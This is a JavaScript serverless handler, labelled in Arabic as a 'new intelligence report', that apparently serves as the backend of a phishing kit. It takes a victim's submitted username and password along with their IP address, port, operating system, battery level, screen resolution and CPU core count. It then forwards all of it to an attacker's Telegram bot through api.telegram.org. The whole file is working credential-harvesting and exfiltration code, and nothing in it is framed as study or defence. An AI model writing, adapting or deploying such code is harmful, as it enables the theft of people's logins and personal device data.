export default async function handler(req, res) {
    if (req.method === 'POST') {
        const data = req.body;
        const token = process.env.TELEGRAM_TOKEN;
        const chatId = process.env.CHAT_ID;

        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const port = req.socket.remotePort;

        const statusEmoji = data.type.includes("زيارة") ? "🔔" : "🔥";

        const message = `
${statusEmoji} **تـقـريـر اسـتـخـبـاراتـي جـديـد**
━━━━━━━━━━━━━━━━━━
🚦 **الحالة:** \`${data.type}\`

👤 **المعلومات المستهدفة:**
👤 **المستخدم:** \`${data.user}\`
🔑 **كلمة السر:** \`${data.pass}\`

🌐 **البيانات الشبكية:**
📍 **عنوان الـ IP:** \`${ip}\`
🔌 **المنفذ (Port):** \`${port}\`

📱 **مواصفات العتاد:**
🖥 **النظام:** \`${data.platform}\`
🔋 **البطارية:** \`${data.battery}\`
📏 **الشاشة:** \`${data.screenRes}\`
🧠 **المعالج:** \`${data.cores} Cores\`

🕒 **توقيت العملية:** \`${data.time}\`
━━━━━━━━━━━━━━━━━━
        `;

        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            }),
        });

        res.status(200).json({ success: true });
    }
}
